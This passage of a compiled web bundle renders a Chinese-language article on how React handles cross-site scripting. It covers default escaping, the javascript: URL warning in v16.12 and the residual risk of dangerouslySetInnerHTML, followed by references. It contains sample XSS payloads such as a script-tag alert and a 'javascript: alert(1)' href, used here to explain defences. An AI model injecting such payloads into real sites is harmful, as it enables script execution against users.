"),a("p",[t._v("最后，让我们看看React里的XSS情况怎么样。")]),t._v(" "),a("h2",{attrs:{id:"_1-react默认会把所有输出dom的内容做转义处理以防止xss。"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_1-react默认会把所有输出dom的内容做转义处理以防止xss。"}},[t._v("#")]),t._v(" 1. React默认会把所有输出DOM的内容做转义处理以防止XSS。")]),t._v(" "),a("p",[t._v("比如：")]),t._v(" "),a("div",{staticClass:"language-jsx extra-class"},[a("pre",{pre:!0,attrs:{class:"language-jsx"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("const")]),t._v(" userInput "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'<script>alert(0)<\/script>'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("div")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("userInput"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("div")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])])]),a("p",[t._v("会被转义成：")]),t._v(" "),a("div",{staticClass:"language-html extra-class"},[a("pre",{pre:!0,attrs:{class:"language-html"}},[a("code",[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("div")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),a("span",{pre:!0,attrs:{class:"token entity",title:"<"}},[t._v("&lt;")]),t._v("script"),a("span",{pre:!0,attrs:{class:"token entity",title:">"}},[t._v("&gt;")]),t._v("alert(0);"),a("span",{pre:!0,attrs:{class:"token entity",title:"<"}},[t._v("&lt;")]),t._v("/script"),a("span",{pre:!0,attrs:{class:"token entity",title:">"}},[t._v("&gt;")]),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("div")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])])]),a("h2",{attrs:{id:"_2-某些常见的xss标签属性，react也会做处理。"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_2-某些常见的xss标签属性，react也会做处理。"}},[t._v("#")]),t._v(" 2. 某些常见的XSS标签属性，React也会做处理。")]),t._v(" "),a("p",[t._v("例如a标签的href：")]),t._v(" "),a("div",{staticClass:"language-jsx extra-class"},[a("pre",{pre:!0,attrs:{class:"language-jsx"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("const")]),t._v(" userInput "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'javascript: alert(1)'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("a")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("href")]),a("span",{pre:!0,attrs:{class:"token script language-javascript"}},[a("span",{pre:!0,attrs:{class:"token script-punctuation punctuation"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("userInput"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")])]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),a("span",{pre:!0,attrs:{class:"token plain-text"}},[t._v("link")]),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("a")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])])]),a("p",[t._v("上面的例子，当前版本的React（v16.12）还是会出现XSS问题的，不过React给出了一个warning，并且特意说明了未来版本会禁止这种行为：")]),t._v(" "),a("blockquote",[a("p",[t._v("Warning: A future version of React will block javascript: URLs as a security precaution. Use event handlers instead if you can. If you need to generate unsafe HTML try using dangerouslySetInnerHTML instead.")])]),t._v(" "),a("p",[t._v("如果href使用base64转码，React会直接拦截这种行为并报错：")]),t._v(" "),a("blockquote",[a("p",[t._v("Not allowed to navigate top frame to data URL.")])]),t._v(" "),a("p",[t._v("所以总的来说，React在各种场景下都是很安全的。不过有一个例外，那就是dangerouslySetInnerHTML，问题到最后都归结到了人。")]),t._v(" "),a("p",[t._v("比如在一些富文本环境下，经常容易出现dangerouslySetInnerHTML的情况，这时候就需要配合其他手段预防XSS了。")]),t._v(" "),a("h1",{attrs:{id:"参考资料"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#参考资料"}},[t._v("#")]),t._v(" 参考资料")]),t._v(" "),a("ul",[a("li",[a("a",{attrs:{href:"https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A7-Cross-Site_Scripting_(XSS)",target:"_blank",rel:"noopener noreferrer"}},[t._v("OWASP: Cross Site Scripting"),a("OutboundLink")],1)]),t._v(" "),a("li",[a("a",{attrs:{href:"https://owasp.org/www-project-cheat-sheets/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#XSS_Prevention_Rules",target:"_blank",rel:"noopener noreferrer"}},[t._v("OWASP: XSS Prevention Cheat Sheet"),a("OutboundLink")],1)]),t._v(" "),a("li",[a("a",{attrs:{href:"https://en.wikipedia.org/wiki/Cross-site_scripting#Background",target:"_blank",rel:"noopener noreferrer"}},[t._v("Wikipedia: Cross Site Scripting"),a("OutboundLink")],1)]),t._v(" "),a("li",[a("a",{attrs:{href:"https://juejin.im/post/5d169a12f265da1bd424942e",target:"_blank",rel:"noopener noreferrer"}},[t._v("掘金：你不能错过的XSS指引"),a("OutboundLink")],1)]),t._v(" "),a("li",[a("a",{attrs:{href:"https://pentest-tools.com/blog/xss-attacks-practical-scenarios/",target:"_blank",rel:"noopener noreferrer"}},[t._v("pentest: XSS Attachs Practical Scenarios"),a("OutboundLink")],1)]),t._v(" "),a("li",[a("a",{attrs:{href:"https://blog.csdn.net/qq_29277155/article/details/51320064",target:"_blank",rel:"noopener noreferrer"}},[t._v("CSDN: XSS插入绕过一些方式总结"),a("OutboundLink")],1)]),t._v(" "),a("li",[a("a",{attrs:{href:"https://portswigger.net/web-security/cross-site-scripting",target:"_blank",rel:"noopener noreferrer"}},[t._v("PortSwigger: Cross-site scripting"),a("OutboundLink")],1)]),t._v(" "),a("li",[a("a",{attrs:{href:"https://stackoverflow.com/questions/7381974/which-characters-need-to-be-escaped-in-html",target:"_blank",rel:"noopener noreferrer"}},[t._v("Stack Overflow: Which characters need to be escaped in HTML?"),a("OutboundLink")],1)]),t._v(" "),a("li",[a("a",{attrs:{href:"https://stackoverflow.com/questions/33644499/what-does-it-mean-when-they-say-react-is-xss-protected",target:"_blank",rel:"noopener noreferrer"}},[t._v("Stack Overflow: What does it mean when they say React is XSS protected?"),a("OutboundLink")],1)]),t._v(" "),a("li",[a("a",{attrs:{href:"https://medium.com/node-security/the-most-common-xss-vulnerability-in-react-js-applications-2bdffbcc1fa0",target:"_blank",rel:"noopener noreferrer"}},[t._v("Medium: The Most Common XSS Vulnerability in React.js Applications"),a("OutboundLink")],1)])])])}),[],!1,null,null,null);s.default=n.exports}}]);